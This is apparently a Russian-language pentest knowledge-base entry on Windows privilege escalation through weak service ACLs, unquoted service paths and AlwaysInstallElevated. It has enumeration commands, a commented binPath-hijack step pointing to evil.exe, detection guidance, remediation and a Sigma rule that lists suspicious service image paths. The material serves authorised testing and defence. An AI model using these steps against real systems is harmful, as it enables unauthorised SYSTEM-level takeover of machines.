---
id: windows-service-permissions
title: "Windows: слабые ACL сервисов (binPath, перезапись бинарника, unquoted)"
type: privesc
target: windows
category: web
difficulty: intermediate
bypass: none
tags: [privesc, windows, services, acl, unquoted-path, accesschk]
tested_on: ["Windows Server 2022", "Windows 10/11 (собственные ВМ)"]
success_rate: 0.6
risk: high
cwe: "CWE-732"
lab: null
last_verified: "2026-10-23"
references:
  - "https://attack.mitre.org/techniques/T1574/"
  - "https://lolbas-project.github.io/"
---

# Windows: слабые ACL сервисов (binPath, перезапись бинарника, unquoted)

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
# 1) список сервисов и их binPath (нативные средства)
sc query type= service state= all | findstr SERVICE_NAME > %TEMP%\svc.txt
for /f "tokens=2" %s in (%TEMP%\svc.txt) do @sc qc %s | findstr BINARY_PATH_NAME

# 2) права на сервисы (Sysinternals accesschk — на своей ВМ)
accesschk64.exe -uwcqv "Authenticated Users" * /accepteula
accesschk64.exe -uwcqv "BUILTIN\Users" * /accepteula
# SERVICE_CHANGE_CONFIG -> sc config <svc> binPath= "C:\Temp\evil.exe"
# SERVICE_STOP/START      -> перезапуск после подмены
# SERVICE_ALL_ACCESS      -> полный контроль

# 3) права на исполняемый файл сервиса
accesschk64.exe -quw "Authenticated Users" "C:\Program Files\App\svc.exe"
# если (F) или (M) — перезапись бинарника и перезапуск сервиса

# 4) unquoted service path с пробелами
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\"
# пример: C:\Program Files\App Dir\Service Name\svc.exe
# система ищет по префиксам: C:\Program.exe, C:\Program Files\App.exe, ...
# -> если есть запись в промежуточный каталог, подкладываем свой exe

# 5) права на каталоги в binPath
icacls "C:\Program Files\App Dir"
# (M)/(F) для Users или Authenticated Users — вектор подмены

# 6) всегда проверяемые «слабые места по умолчанию»:
#    AlwaysInstallElevated:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Explanation

Службы Windows — самый частый источник локальной эскалации, и причины
три:

1. **Слабые ACL на объект сервиса** (`SERVICE_CHANGE_CONFIG`,
    `SERVICE_ALL_ACCESS` у `Authenticated Users`). Позволяет изменить
    `binPath` на свой исполняемый файл и перезапустить службу.
2. **Слабые ACL на исполняемый файл или его каталог**. Перезапись
    `svc.exe` даёт выполнение от учётки службы (часто `LocalSystem`).
    Отдельно опасна запись в родительский каталог: можно подменить
    DLL, который бинарник загружает (DLL hijacking).
3. **Unquoted service path с пробелами**. Windows перебирает пути,
    добавляя по одному сегменту: для `C:\Program Files\App Dir\svc.exe`
    пробуются `C:\Program.exe`, `C:\Program Files\App.exe`,
    `C:\Program Files\App Dir\svc.exe`. Запись в промежуточный каталог
    = выполнение своего кода.

Дополнительно: `AlwaysInstallElevated` (MSI ставится от SYSTEM),
автораскрытие служб с подменяемыми зависимостями, службы, запускающие
скрипты из пользовательских каталогов.

Методика аудита: собрать список служб с `binPath`, проверить ACL объекта
службы, ACL файла, ACL всех каталогов пути, наличие кавычек и пробелов.

## Detection

* Sysmon EventID 1 (создание процесса) от `services.exe` с `Image`
  вне `C:\Windows` — аномальный binPath.
* EventID 7045 (установка новой службы) — всегда алерт в production.
* EventID 4697 (служба установлена в системе) и 4698 (создание задания).
* Sysmon EventID 11/23: запись файлов в `C:\Program Files\...` процессом
  не-установщика.
* Контроль ACL: baseline-скан `sc sdshow` и `icacls` на нестандартные
  разрешения для `Authenticated Users`/`BUILTIN\Users`.
* Детект `accesschk`/`sc config`/`sc create` от непривилегированного
  пользователя.
* PowerShell-лог (EventID 4104): `Get-Acl`, `Set-Service`, `New-Service`.

## Remediation

- Минимальные ACL: у объектов служб и их бинарников права только у
  `SYSTEM`, `Administrators` и владельца; никаких `Authenticated Users`.
- Все пути в `binPath` — в кавычках и полные; каталоги с пробелами
  проверять отдельно.
- Каталог установки программы: `Users`/`Authenticated Users` не имеют
  записи; обновления выполняет только установщик от администратора.
- `AlwaysInstallElevated` отключён (GPO: Computer Configuration →
  Administrative Templates → Windows Components → Installer).
- Службы запускают код из защищённых каталогов, не из `C:\Users`,
  `C:\Temp`, сетевых шар.
- Регулярный аудит ACL служб (скрипт/GPO-бейзлайн) и контроль изменений
  через EventID 7045.
- DLL-поиск: `SafeDllSearchMode`, `CWDIllegalInDllSearch=2`, manifest
  с явными зависимостями.


## Detection rules

```yaml
title: Подмена binPath службы или запуск службы из нестандартного каталога
id: c3d4e5f6-0007-4c3d-9e4f-000000000207
status: experimental
description: >-
  Изменение конфигурации службы (binPath) и запуск исполняемого файла службой
  из каталогов, доступных на запись непривилегированным пользователям.
references:
  - https://attack.mitre.org/techniques/T1574/009/
  - https://attack.mitre.org/techniques/T1543/003/
logsource:
  product: windows
  service: security
  definition: 'аудит изменений служб (4697, 7045) + Sysmon EventID 1'
detection:
  service_config_change:
    EventID: 4697
  new_service:
    EventID: 7045
    ImagePath|contains:
      - '\Users\'
      - '\Temp\'
      - '\ProgramData\'
      - '\Public\'
      - 'cmd.exe'
      - 'powershell'
      - 'mshta'
  process_from_writable:
    EventID: 1
    ParentImage|endswith: '\services.exe'
    Image|contains:
      - '\Users\'
      - '\Temp\'
      - '\ProgramData\'
  sc_config:
    EventID: 1
    Image|endswith: '\sc.exe'
    CommandLine|contains:
      - 'config'
      - 'binPath'
  condition: new_service or process_from_writable or sc_config
fields:
  - ImagePath
  - CommandLine
  - ParentImage
  - AccountName
falsepositives:
  - установщики вендорного ПО (фильтруйте по подписи и ParentImage)
level: high
tags:
  - attack.persistence
  - attack.privilege_escalation
  - attack.t1574.009
  - attack.t1543.003
```
